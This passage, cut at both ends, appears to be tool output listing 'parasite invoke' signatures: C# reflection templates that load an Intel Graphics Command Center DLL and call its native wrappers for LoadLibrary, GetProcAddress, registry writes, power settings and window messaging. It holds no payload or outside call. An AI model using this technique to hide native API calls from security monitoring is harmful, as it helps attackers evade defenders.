        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpszDriver, string lpszDevice, string lpszOutput, uint lpInitData });
        ===END SIGNATURE===

Method: DeleteDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DeleteDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc });
        ===END SIGNATURE===

Method: D3DKMTOpenAdapterFromHdc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTOpenAdapterFromHdc"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { D3DKMT_OPENADAPTERFROMHDC& Arg });
        ===END SIGNATURE===

Method: D3DKMTCloseAdapter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTCloseAdapter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { D3DKMT_CLOSEADAPTER& Arg });
        ===END SIGNATURE===

Method: D3DKMTEscape
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTEscape"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus) methodInfo.Invoke(null, new object[] { D3DKMT_ESCAPE& escapeData });
        ===END SIGNATURE===

Method: D3DKMTOpenAdapterFromDeviceName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTOpenAdapterFromDeviceName"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { D3DKMT_OPENADAPTERFROMDEVICENAME& deviceArgs });
        ===END SIGNATURE===

Method: D3DKMTQueryAdapterInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTQueryAdapterInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus) methodInfo.Invoke(null, new object[] { D3DKMT_QUERYADAPTERINFO& deviceArg });
        ===END SIGNATURE===

Method: LoadLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LoadLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string path });
        ===END SIGNATURE===

Method: GetProcAddress
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetProcAddress"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hModule, string procName });
        ===END SIGNATURE===

Method: FreeLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""FreeLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hModule });
        ===END SIGNATURE===

Method: LoadPackagedLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LoadPackagedLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string libFileName, uint Reserved });
        ===END SIGNATURE===

Method: SetDeviceGammaRamp
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDeviceGammaRamp"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDC, RAMP& lpRamp });
        ===END SIGNATURE===

Method: GetDeviceGammaRamp
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDeviceGammaRamp"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDC, RAMP& lpRamp });
        ===END SIGNATURE===

Method: GetDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hWnd });
        ===END SIGNATURE===

Method: ReleaseDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ReleaseDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, IntPtr hDC });
        ===END SIGNATURE===

Method: RegisterHotKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterHotKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int id, int fsModifiers, Keys vk });
        ===END SIGNATURE===

Method: UnregisterHotKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""UnregisterHotKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int id });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: SendMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SendMessage"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam });
        ===END SIGNATURE===

Method: RegisterWindowMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterWindowMessage"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { string lpString });
        ===END SIGNATURE===

Method: RegCloseKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCloseKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey });
        ===END SIGNATURE===

Method: RegQueryValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegQueryValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int lpReserved, Int32& type, IntPtr lpData, Int32& lpcbData });
        ===END SIGNATURE===

Method: RegQueryValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegQueryValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int lpReserved, Int32& type, StringBuilder lpData, Int32& lpcbData });
        ===END SIGNATURE===

Method: RegOpenKeyEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegOpenKeyEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string subKey, int ulOptions, uint samDesired, IntPtr& hkResult });
        ===END SIGNATURE===

Method: RegSetValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegSetValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int Reserved, RegistryValueKind dwType, IntPtr lpData, int cbData });
        ===END SIGNATURE===

Method: RegCreateKeyA
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCreateKeyA"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { uint hKey, string lpSubKey, IntPtr phkResult });
        ===END SIGNATURE===

Method: RegCreateKeyEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCreateKeyEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpSubKey, int Reserved, string lpClass, RegOption dwOptions, RegSAM samDesired, IntPtr lpSecurityAttributes, IntPtr& phkResult, RegResult& lpdwDisposition });
        ===END SIGNATURE===

Method: RegisterDeviceNotification
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterDeviceNotification"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, IntPtr NotificationFilter, uint Flags });
        ===END SIGNATURE===

Method: PowerSetActiveScheme
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerSetActiveScheme"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr UserPowerKey, Guid& ActivePolicyGuid });
        ===END SIGNATURE===

Method: PowerGetActiveScheme
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerGetActiveScheme"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr UserPowerKey, IntPtr& ActivePolicyGuid });
        ===END SIGNATURE===

Method: PowerReadFriendlyName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadFriendlyName"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr RootPowerKey, Guid& SchemeGuid, IntPtr SubGroupOfPowerSettingsGuid, IntPtr PowerSettingGuid, IntPtr Buffer, UInt32& BufferSize });
        ===END SIGNATURE===

Method: PowerReadDCValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadDCValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, UInt32& DcValueIndex });
        ===END SIGNATURE===

Method: PowerWriteDCValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerWriteDCValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, uint DcValueIndex });
        ===END SIGNATURE===

Method: PowerReadACValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadACValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, UInt32& DcValueIndex });
        ===END SIGNATURE===

Method: PowerWriteACValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerWriteACValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, uint DcValueIndex });
        ===END SIGNATURE===

Method: RegisterPowerSettingNotification
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterPowerSettingNotification"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, Guid& PowerSettingGuid, int Flags });
        ===END SIGNATURE===

Method: GetSystemPowerStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetSystemPowerStatus"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { SYSTEM_POWER_STATUS& systemPowerStatus });
        ===END SIGNATURE===

Method: clGetPlatformIDs
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformIDs"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { uint numEntries, PlatformID[] platforms, UInt32& numPlatforms });
        ===END SIGNATURE===

Method: clGetPlatformInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { PlatformID platform, PlatformInfo param_name, IntPtr param_value_size, Byte[] param_value, IntPtr& param_value_size_ret });
        ===END SIGNATURE===

Method: CreateDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateDC"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData });
        ===END SIGNATURE===

Method: clGetPlatformInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformInfo"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { PlatformID platform, PlatformInfo param_name, IntPtr param_value_size, IntPtr param_value, IntPtr& param_value_size_ret });
        ===END SIGNATURE===

Method: ChoosePixelFormat
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChoosePixelFormat"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hdc, PixelFormatDescriptor& pfd });
        ===END SIGNATURE===

Method: SetPixelFormat
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetPixelFormat"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc, int iPixelFormat, PixelFormatDescriptor& pfd });
        ===END SIGNATURE===

Method: wglCreateContext
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglCreateContext"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hdc });
        ===END SIGNATURE===

Method: wglMakeCurrent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglMakeCurrent"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc, IntPtr hglrc });
        ===END SIGNATURE===

Method: wglDeleteContext
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
